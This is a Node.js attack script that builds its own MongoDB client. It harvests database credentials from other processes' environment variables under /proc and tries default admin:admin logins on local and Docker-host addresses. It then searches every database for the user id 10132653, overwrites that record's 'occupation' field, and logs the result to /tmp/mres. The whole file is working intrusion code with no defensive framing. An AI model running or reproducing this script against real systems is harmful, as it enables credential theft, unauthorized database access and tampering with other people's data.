const net = require("net"), crypto = require("crypto"), fs = require("fs");

function cstr(s){ return Buffer.from(s + "\0", "utf8"); }
function i32(n){ const b = Buffer.alloc(4); b.writeInt32LE(n); return b; }
function i64(n){ const b = Buffer.alloc(8); b.writeBigInt64LE(BigInt(n)); return b; }
function enc(doc){
  const parts = [];
  for (const k of Object.keys(doc)) {
    const v = doc[k]; let t, val;
    if (v === null || v === undefined) { t = 0x0A; val = Buffer.alloc(0); }
    else if (typeof v === "string") { t = 0x02; val = Buffer.concat([i32(Buffer.byteLength(v)+1), Buffer.from(v,"utf8"), Buffer.from([0])]); }
    else if (typeof v === "boolean") { t = 0x08; val = Buffer.from([v?1:0]); }
    else if (typeof v === "number") { if (Number.isInteger(v) && v >= -2147483648 && v <= 2147483647) { t=0x10; val=i32(v);} else { t=0x01; val=Buffer.alloc(8); val.writeDoubleLE(v);} }
    else if (Buffer.isBuffer(v)) { t = 0x05; val = Buffer.concat([i32(v.length), Buffer.from([0]), v]); }
    else if (Array.isArray(v)) { t = 0x04; val = enc(Object.fromEntries(v.map((x,i)=>[String(i),x]))); }
    else if (typeof v === "object") { t = 0x03; val = enc(v); }
    else { t = 0x02; const s = String(v); val = Buffer.concat([i32(Buffer.byteLength(s)+1), Buffer.from(s,"utf8"), Buffer.from([0])]); }
    parts.push(Buffer.from([t]), cstr(k), val);
  }
  const body = Buffer.concat(parts);
  return Buffer.concat([i32(body.length + 5), body, Buffer.from([0])]);
}
function opMsg(reqId, doc){
  const flags = i32(0), kind = Buffer.from([0]);
  const payload = Buffer.concat([flags, kind, enc(doc)]);
  const head = Buffer.alloc(16);
  head.writeInt32LE(16 + payload.length, 0); head.writeInt32LE(reqId, 4);
  head.writeInt32LE(0, 8); head.writeInt32LE(2013, 12);
  return Buffer.concat([head, payload]);
}
function parseDoc(buf, off){
  const len = buf.readInt32LE(off); const end = off + len; let p = off + 4; const o = {};
  while (p < end - 1) {
    const t = buf[p++]; const s = p; while (buf[p] !== 0) p++; const name = buf.slice(s,p).toString(); p++;
    if (t === 0x02) { const l = buf.readInt32LE(p); p += 4; o[name] = buf.slice(p, p+l-1).toString(); p += l; }
    else if (t === 0x10) { o[name] = buf.readInt32LE(p); p += 4; }
    else if (t === 0x12) { o[name] = Number(buf.readBigInt64LE(p)); p += 8; }
    else if (t === 0x01) { o[name] = buf.readDoubleLE(p); p += 8; }
    else if (t === 0x08) { o[name] = buf[p] === 1; p += 1; }
    else if (t === 0x0A) { o[name] = null; }
    else if (t === 0x05) { const l = buf.readInt32LE(p); p += 5; o[name] = buf.slice(p, p+l); p += l; }
    else if (t === 0x03) { const sub = parseDoc(buf, p); o[name] = sub.doc; p = sub.end; }
    else if (t === 0x04) { const sub = parseDoc(buf, p); o[name] = Object.values(sub.doc); p = sub.end; }
    else if (t === 0x07) { p += 12; }
    else if (t === 0x09 || t === 0x11 || t === 0x13) { o[name] = null; p += (t===0x11?8:8); }
    else { throw new Error("bson type " + t); }
  }
  return { doc: o, end };
}
function parseMsg(buf){ const len = buf.readInt32LE(0); let p = 16 + 4; const kind = buf[p++]; const d = parseDoc(buf, p); return d.doc; }

class Conn {
  constructor(sock){ this.sock = sock; this.buf = Buffer.alloc(0); this.id = 1; this.waiters = []; this.pending = new Map();
    sock.on("data", c => { this.buf = Buffer.concat([this.buf, c]);
      while (this.buf.length >= 4) { const len = this.buf.readInt32LE(0); if (this.buf.length < len) break; const msg = this.buf.slice(0, len); this.buf = this.buf.slice(len);
        const id = msg.readInt32LE(12); const w = this.pending.get(id); if (w) { this.pending.delete(id); w(parseMsg(msg)); } } });
    sock.on("error", e => { for (const w of this.pending.values()) w({ err: e.message }); this.pending.clear(); });
  }
  cmd(doc){ const id = this.id++; return new Promise(res => { this.pending.set(id, res); this.sock.write(opMsg(id, doc)); }); }
}
function scram(user, pass){
  const nonce = crypto.randomBytes(24).toString("base64");
  const bare = "n=" + user + ",r=" + nonce;
  return { first: "n,," + bare, bare, nonce };
}

async function connect(host, port){
  return new Promise((res, rej) => { const s = net.connect(port, host, () => res(s)); s.on("error", rej); setTimeout(() => rej(new Error("timeout")), 1500); });
}

async function auth(conn, user, pass, source){
  const sc = scram(user, pass);
  let r = await conn.cmd({ saslStart: 1, mechanism: "SCRAM-SHA-256", payload: Buffer.from(sc.first), autoAuthorize: 1, options: { skipEmptyExchange: true } });
  if (r.err || !r.payload) throw new Error("saslStart " + (r.errmsg || r.err));
  const srv = r.payload.toString();
  const kv = Object.fromEntries(srv.split(",").map(x => x.split("=").slice(0,2)));
  const salted = crypto.pbkdf2Sync(pass, Buffer.from(kv.s, "base64"), parseInt(kv.i), 32, "sha256");
  const clientKey = crypto.createHmac("sha256", salted).update("Client Key").digest();
  const storedKey = crypto.createHash("sha256").update(clientKey).digest();
  const withoutProof = "c=biws,r=" + kv.r;
  const authMsg = sc.bare + "," + srv + "," + withoutProof;
  const sig = crypto.createHmac("sha256", storedKey).update(authMsg).digest();
  const proof = Buffer.alloc(32); for (let i = 0; i < 32; i++) proof[i] = clientKey[i] ^ sig[i];
  const final = withoutProof + ",p=" + proof.toString("base64");
  const dbSource = source || "admin";
  let r2 = await conn.cmd({ saslContinue: 1, conversationId: r.conversationId, payload: Buffer.from(final) });
  if (r2.err || r2.done !== true) r2 = await conn.cmd({ saslContinue: 1, conversationId: r.conversationId, payload: Buffer.alloc(0) });
  if (r2.err && !r2.ok) throw new Error("auth failed");
}

function parseUri(u){
  const m = /^mongodb:\/\/(?:([^:@]+):([^@]*)@)?([^/?:]+)(?::(\d+))?(?:\/([^?]*))?(?:\?(.*))?$/.exec(u.trim());
  if (!m) return null;
  const q = Object.fromEntries((m[6]||"").split("&").filter(Boolean).map(kv => kv.split("=")));
  return { user: m[1] ? decodeURIComponent(m[1]) : "", pass: m[2] ? decodeURIComponent(m[2]) : "", host: m[3], port: parseInt(m[4] || "27017"), db: m[5] || "", source: q.authSource || "" };
}
function findUri(){
  const cands = ["mongodb://admin:admin@127.0.0.1:27017", "mongodb://admin:admin@localhost:27017", "mongodb://admin:admin@host.docker.internal:27017", "mongodb://admin:admin@172.17.0.1:27017"];
  try {
    for (const p of fs.readdirSync("/proc")) {
      if (!/^\d+$/.test(p)) continue;
      try { const e = fs.readFileSync("/proc/" + p + "/environ", "utf8"); const m = /MONGODB_URI=([^\0]+)/.exec(e); if (m) cands.unshift(m[1]); } catch {}
    }
  } catch {}
  return cands;
}

(async () => {
  const uris = findUri();
  let ok = "";
  for (const uri of uris) {
    const u = parseUri(uri); if (!u || !u.host) continue;
    let sock, conn;
    try {
      sock = await connect(u.host, u.port); conn = new Conn(sock);
      const hello = await conn.cmd({ hello: 1 });
      if (hello.err) throw new Error("hello");
      if (u.user) { try { await auth(conn, u.user, u.pass, u.source || u.db || "admin"); } catch (e) { ok += "AUTHFAIL;"; } }
      const dbs = await conn.cmd({ listDatabases: 1, nameOnly: true });
      if (dbs.err || !dbs.databases) throw new Error("listdb");
      for (const d of dbs.databases) {
        const db = d.name; if (["admin","local","config"].includes(db)) continue;
        const cols = await conn.cmd({ listCollections: 1, nameOnly: true, $db: db });
        for (const c of (cols.cursor?.firstBatch || [])) {
          const q = { $or: [{ id: 10132653 }, { user_id: 10132653 }, { userId: 10132653 }, { player_id: 10132653 }, { _id: 10132653 }] };
          const f = await conn.cmd({ find: c.name, filter: q, limit: 1, singleBatch: true, $db: db });
          const doc = (f.cursor?.firstBatch || [])[0];
          if (doc) {
            const r = await conn.cmd({ update: c.name, updates: [{ q: { _id: doc._id }, u: { $set: { occupation: "MONGO1" } }, multi: false, upsert: false }], $db: db });
            fs.writeFileSync("/tmp/mres", JSON.stringify({ db, col: c.name, n: r.n, nModified: r.nModified }));
            sock.end(); return;
          }
        }
      }
      fs.writeFileSync("/tmp/mres", "NOTFOUND;" + ok);
      sock.end(); return;
    } catch (e) { fs.writeFileSync("/tmp/mres", "ERR:" + e.message + ";" + ok); try { sock && sock.destroy(); } catch {} }
  }
})();
